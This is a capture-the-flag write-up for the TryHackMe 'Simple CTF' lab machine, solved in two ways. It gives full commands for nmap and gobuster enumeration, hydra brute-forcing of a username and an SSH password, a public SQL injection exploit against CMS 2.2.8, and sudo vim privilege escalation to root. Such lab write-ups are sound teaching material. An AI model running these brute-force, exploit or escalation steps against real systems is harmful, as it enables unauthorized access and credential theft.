---
layout: solution
category: TryHackMe
contest_code: General
contest_name: General
problem_code: SIMPLE_CTF
problem_name: Simple CTF
comments: false
tags: security enumeration privesc
date: 2021-08-17
---

### An nmap scan was conducted on the machine and results shown that few services were running which included ftp, apache & ssh
```
nmap -sV -sC 10.10.82.183
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/nmap.png)

‎


### An attempt was made to log into ftp by using anonymous login which allowed us to retrieve a file. It tells us that a weak password was used for the system
```
ftp 10.10.82.183
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/ftp.png)

‎


### The website was visited however nothing was interesting thus gobutser was used to find for hidden directories and it was where we came across, few interesting directories. One of them was /simple which lead us to another web page
```
gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.82.183 -x php,html,txt
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/result1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/gobuster1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/result2.png)


‎


### **[Method 1]** Further enumeration was done on this page /simple by attempting to retrieve further hidden directories using gobuster. It then led us to an admin login page (/admin)
```
gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.82.183/simple -x php,html,txt
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/gobuster2.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/login.png)

‎


### **[Method 1]** We can attempt to use hydra on this page to crack the user and password however brute forcing 2 fields (username & password) simultaneously can take a very long time. Thus to overcome that, I clicked on "Forgot your password?"

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/username.png)

When we attempt to enter a wrong username, it redirects us back to the login page with an additional message "User Not Found"

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/incorrect_pass.png)

‎


### **[Method 1]** Thus I used hydra to retrieve the right username which in this was mitch
```
hydra -L xato-net-10-million-usernames.txt 10.10.82.183 -t 64 -e n http-post-form "/simple/admin/login.php?forogtpw=1:forgottenusername=^USER^&forgotpwform=1&loginsubmit=Submit:User Not found"
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/network_page.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/hydra.png)

‎


### **[Method 1]** After finding the right username we can attempt to crack the password using dictionary attack. However I have a choice of cracking it though the website or SSH. For this case I used ssh. Thus, I whipphed out hydra again and cracked the password using ssh. Turns out the password is "secret"
```
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.82.183 ssh -t 64
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/hydra_result.png)

‎


### **[Method 2]** Further enumeration was done on this page /simple by attempting to retrieve further hidden directories using gobuster. It then led us to an install login page (/install.php)
```
gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.82.183/simple -x php,html,txt
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/gobuster3.png)

‎


### **[Method 2]** That install page was visited where it told us the version number of cms service which was 2.2.8

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/result3.png)

‎


### **[Method 2]** Searchsploit was used to find for any exploits for that service and version and turn out it was vulnerable to SQL injection thus the exploit tool was installed for execution. 
```
searchsploit -m php/webapps/46635.py
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/searchsploit.png)

‎


### **[Method 2]** Once the exploit was executed, the username and password was retrieved. 
```
python2 ./46635.py -u http://10.10.82.183/simple -w /usr/share/wordlists/rockyou.txt --crack
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/exploit_result.png)

‎


### I then logged into SSH with the following credentials obtained and retrieved the first flag

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/ssh.png)

‎


### To perform privilege escalation, I figured out the permissions user mitch has. Fortunately, he had permissions to execute vim as sudo without password. Thus, I executed vim with sudo and executed bash command inside vim to perform privilege escalation. Thus, it allowed me to retrieve the last flag in /root directory

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/priv1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Simple%20CTF/priv2.png)

<pre 
  class="command-line" 
  data-prompt="root@machine: " 
  data-output="2"
><code class="language-bash">cat /root/root.txt
W3ll d0n3. You made it!
</code>
</pre> 
